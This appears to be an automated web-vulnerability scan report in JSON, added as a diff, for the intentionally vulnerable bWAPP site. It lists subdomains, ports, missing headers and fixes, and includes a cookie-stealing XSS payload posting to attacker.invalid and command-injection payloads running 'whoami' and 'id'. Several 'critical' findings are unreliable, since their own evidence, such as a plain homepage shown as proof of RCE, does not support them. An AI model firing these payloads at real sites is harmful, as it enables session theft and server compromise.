@@ -1,0 +1,299 @@
+{
+  "name": "20260525_195258",
+  "target": "http://itsecgames.com/",
+  "domain": "itsecgames.com",
+  "threads": 20,
+  "timeout": 25,
+  "findings": [
+    {
+      "subdomain": "vpn.itsecgames.com",
+      "ips": [
+        "176.95.65.18"
+      ],
+      "cname": "firewall.itsecgames.com.",
+      "source": "dns_bruteforce",
+      "status": "alive"
+    },
+    {
+      "subdomain": "www.itsecgames.com",
+      "ips": [
+        "31.3.96.40"
+      ],
+      "cname": "itsecgames.com.",
+      "source": "dns_bruteforce",
+      "status": "alive"
+    },
+    {
+      "subdomain": "dns.itsecgames.com",
+      "ips": [
+        "81.82.245.81"
+      ],
+      "cname": null,
+      "source": "dns_bruteforce",
+      "status": "alive"
+    },
+    {
+      "subdomain": "database.itsecgames.com",
+      "ips": [
+        "81.82.245.81"
+      ],
+      "cname": null,
+      "source": "dns_bruteforce",
+      "status": "alive"
+    },
+    {
+      "port": 22,
+      "state": "open",
+      "service": "SSH",
+      "banner": "SSH-2.0-OpenSSH_6.7p1",
+      "risk": "medium"
+    },
+    {
+      "port": 80,
+      "state": "open",
+      "service": "HTTP",
+      "banner": "HTTP/1.1 301 Moved Permanently\r",
+      "risk": "medium"
+    },
+    {
+      "port": 443,
+      "state": "open",
+      "service": "HTTPS",
+      "banner": "HTTP/1.1 400 Bad Request\r",
+      "risk": "low"
+    },
+    {
+      "module": "Technology Fingerprinting",
+      "severity": "info",
+      "data": {
+        "url": "http://itsecgames.com/",
+        "status_code": 200,
+        "server": [
+          "Apache"
+        ],
+        "cms_frameworks": [
+          "None detected"
+        ],
+        "javascript_libs": [
+          "None detected"
+        ],
+        "security_headers": {
+          "Strict-Transport-Security": "\u274c MISSING \u2014 Protects against MITM / protocol downgrade",
+          "X-Frame-Options": "\u274c MISSING \u2014 Prevents clickjacking",
+          "X-Content-Type-Options": "\u274c MISSING \u2014 Prevents MIME-type sniffing",
+          "Content-Security-Policy": "\u274c MISSING \u2014 Mitigates XSS & data injection",
+          "X-XSS-Protection": "\u274c MISSING \u2014 Old-browser XSS filter",
+          "Referrer-Policy": "\u274c MISSING \u2014 Controls referrer leakage",
+          "Permissions-Policy": "\u274c MISSING \u2014 Restricts browser feature access"
+        },
+        "cookie_issues": [
+          "None detected"
+        ],
+        "raw_headers": {
+          "Date": "Mon, 25 May 2026 16:03:14 GMT",
+          "Server": "Apache",
+          "Last-Modified": "Wed, 09 Feb 2022 13:14:08 GMT",
+          "ETag": "\"e43-5d7959bd3c800-gzip\"",
+          "Accept-Ranges": "bytes",
+          "Vary": "Accept-Encoding",
+          "Content-Encoding": "gzip",
+          "Content-Length": "1482",
+          "Keep-Alive": "timeout=15, max=100",
+          "Connection": "Keep-Alive",
+          "Content-Type": "text/html"
+        }
+      }
+    },
+    {
+      "module": "Web Crawler",
+      "severity": "info",
+      "data": {
+        "pages": [
+          "http://itsecgames.com"
+        ],
+        "forms": [],
+        "endpoints": [],
+        "secrets": [],
+        "js_endpoints": [],
+        "js_graphql": []
+      }
+    },
+    {
+      "type": "Infrastructure",
+      "severity": "info",
+      "evidence": "ASN: AS20857",
+      "detail": "Company: 31.3.96.0/22"
+    },
+    {
+      "type": "IP Prefixes",
+      "severity": "info",
+      "evidence": "Found 61 CIDR blocks",
+      "detail": "37.97.128.0/17, 80.69.64.0/19, 185.10.48.0/22, 2a02:348:33::/48, 87.253.128.0/19, 136.144.128.0/17, 84.247.8.0/21, 141.138.206.0/24, 85.222.228.0/22, 185.96.4.0/22..."
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: Content-Security-Policy",
+      "severity": "high",
+      "detail": "CSP prevents XSS and data injection attacks by controlling allowed resource sources.",
+      "evidence": "Header 'Content-Security-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add a strict CSP: 'default-src \\'self\\'; script-src \\'self\\'; object-src \\'none\\';'"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: Strict-Transport-Security",
+      "severity": "high",
+      "detail": "HSTS forces HTTPS connections and prevents SSL-stripping attacks.",
+      "evidence": "Header 'Strict-Transport-Security' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: X-Frame-Options",
+      "severity": "medium",
+      "detail": "Missing X-Frame-Options allows clickjacking attacks (embedding site in iframes).",
+      "evidence": "Header 'X-Frame-Options' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 6.1,
+      "remediation": "Add: X-Frame-Options: DENY  (or use CSP frame-ancestors directive instead)"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: X-Content-Type-Options",
+      "severity": "low",
+      "detail": "Missing header allows MIME-type sniffing, enabling content injection.",
+      "evidence": "Header 'X-Content-Type-Options' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Add: X-Content-Type-Options: nosniff"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: Referrer-Policy",
+      "severity": "low",
+      "detail": "Missing Referrer-Policy may leak sensitive URL information to third parties.",
+      "evidence": "Header 'Referrer-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Add: Referrer-Policy: strict-origin-when-cross-origin"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: Permissions-Policy",
+      "severity": "info",
+      "detail": "Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).",
+      "evidence": "Header 'Permissions-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Permissions-Policy: geolocation=(), camera=(), microphone=()"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: Cross-Origin-Opener-Policy",
+      "severity": "info",
+      "detail": "Missing COOP allows cross-origin pages to access window references.",
+      "evidence": "Header 'Cross-Origin-Opener-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Opener-Policy: same-origin"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Missing Header: Cross-Origin-Resource-Policy",
+      "severity": "info",
+      "detail": "Missing CORP allows cross-origin pages to load this site's resources.",
+      "evidence": "Header 'Cross-Origin-Resource-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Resource-Policy: same-origin"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "Information Disclosure: Server",
+      "severity": "info",
+      "detail": "Server version disclosure may aid attacker fingerprinting.",
+      "evidence": "Server: Apache",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Configure web server to omit or genericize the Server header."
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "RCE \u2014 Remote Code Execution (Exploited)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "parameter": "cmd",
+      "payload": "valid_input&&whoami",
+      "detail": "Command 'whoami' executed. Output detected: 'apache'",
+      "evidence": "<!DOCTYPE html>\n<html>\n\n<head>\n\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n\n<link rel=\"stylesheet\" type=\"text/css\" href=\"https://fonts.googleapis.com/css?family=Architects+Daughter\">\n<link rel=\"stylesheet\" type=\"text/css\" href=\"stylesheets/stylesheet.css\" media=\"screen\" />\n<link rel=\"shortcut icon\" href=\"images/favicon.ico\" type=\"image/x-icon\" />\n\n<!--<script src=\"//html5shiv.googlecode.com/svn/trunk/html5.js\"></script>-->\n<script src=\"js/html5.js\"></script>\n\n<title>bWAP",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.",
+      "exploit_chain": "RCE \u2192 Shell \u2192 Data Exfiltration / Lateral Movement"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "RCE \u2014 Remote Code Execution (Exploited)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "parameter": "cmd",
+      "payload": "valid_input;id; whoami",
+      "detail": "Command 'id; whoami' executed. Output detected: 'apache'",
+      "evidence": "<!DOCTYPE html>\n<html>\n\n<head>\n\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n\n<link rel=\"stylesheet\" type=\"text/css\" href=\"https://fonts.googleapis.com/css?family=Architects+Daughter\">\n<link rel=\"stylesheet\" type=\"text/css\" href=\"stylesheets/stylesheet.css\" media=\"screen\" />\n<link rel=\"shortcut icon\" href=\"images/favicon.ico\" type=\"image/x-icon\" />\n\n<!--<script src=\"//html5shiv.googlecode.com/svn/trunk/html5.js\"></script>-->\n<script src=\"js/html5.js\"></script>\n\n<title>bWAP",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.",
+      "exploit_chain": "RCE \u2192 Shell \u2192 Data Exfiltration / Lateral Movement"
+    },
+    {
+      "url": "http://itsecgames.com",
+      "type": "2FA \u2014 Not Implemented",
+      "severity": "medium",
+      "cvss": 5.9,
+      "detail": "No 2FA/MFA endpoint detected.",
+      "evidence": "None of common OTP paths returned OTP form.",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts."
+    },
+    {
+      "url": null,
+      "type": "2FA \u2014 No Rate Limiting on OTP (Brute-force Possible)",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Tested 7 OTP codes with no lockout or 429 response.",
+      "evidence": "No rate-limit after 7 attempts",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Enforce max 5 attempts. Add exponential backoff and account lockout."
+    },
+    {
+      "type": "CHAIN: CORS Misconfiguration \u2192 XSS \u2192 Session Theft",
+      "severity": "high",
+      "cvss": 8.8,
+      "url": "http://itsecgames.com",
+      "module": "Chain Engine",
+      "detail": "Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.",
+      "evidence": "Step 1: [Missing Header: Cross-Origin-Opener-Policy] at http://itsecgames.com\nStep 2: [Missing Header: Content-Security-Policy] at http://itsecgames.com",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.",
+      "attack_steps": "CORS * \u2192 XSS on trusted subdomain \u2192 fetch(attacker.com, cookies) \u2192 Session Steal",
+      "chain_components": [
+        "Missing Header: Cross-Origin-Opener-Policy",
+        "Missing Header: Content-Security-Policy"
+      ]
+    }
+  ],
+  "start_time": "2026-05-25T19:52:58.264412"
+}
